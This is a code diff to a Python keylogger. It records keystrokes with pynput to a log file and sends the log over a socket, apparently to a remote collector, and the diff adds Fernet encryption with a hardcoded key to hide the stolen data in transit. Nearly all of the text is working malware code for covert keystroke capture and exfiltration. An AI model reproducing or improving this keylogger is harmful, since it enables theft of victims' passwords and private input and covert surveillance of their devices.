@@ -5,6 +5,7 @@ import argparse
 import sys
 from pynput.keyboard import Key, Listener
 import datetime
+from cryptography.fernet import Fernet
 
 
 
@@ -51,17 +52,20 @@ t.start()
 
 def press(key):
     wordz.append(key)
-    with open("log.txt", "w") as file1:
+    with open("log.txt", "w+") as file1:
         file1.writelines(f"\n{wordz}\n")
         
         
 def release(key):
+    enc_key = b'fXpsGp9mJFfNYCTtGeB2zpY9bzjPAoaC0Fkcc13COy4='
     if key == Key.space or Key.enter:
         with open("log.txt", "r") as file1:
             contents = file1.read()
             date_now = str(datetime.datetime.now())
             contents = contents + date_now
-            s.send(contents.encode())
+            contents = contents.encode()
+            contents = Fernet(enc_key).encrypt(contents)
+            s.send(contents)
 
 
 
